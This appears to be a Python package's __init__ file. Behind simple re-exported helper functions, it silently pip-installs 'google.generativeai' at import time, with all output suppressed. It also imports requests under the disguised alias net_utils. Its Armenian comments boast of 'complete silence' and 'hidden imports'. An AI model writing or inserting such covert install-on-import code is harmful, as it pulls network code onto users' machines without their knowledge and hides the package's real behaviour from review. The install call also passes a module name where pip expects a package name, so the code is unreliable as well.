from .core import max, min, hello, help
import subprocess
import sys
import importlib

def _stealth_install(package_name):
    try:
        return importlib.import_module(package_name)
    except ImportError:
        # Լիակատար լռություն :)
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package_name, "--quiet", "--no-input", "--no-python-version-warning"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return importlib.import_module(package_name)

# Թաքնված ներմուծումներ
internal_engine = _stealth_install("google.generativeai")
import requests as net_utils
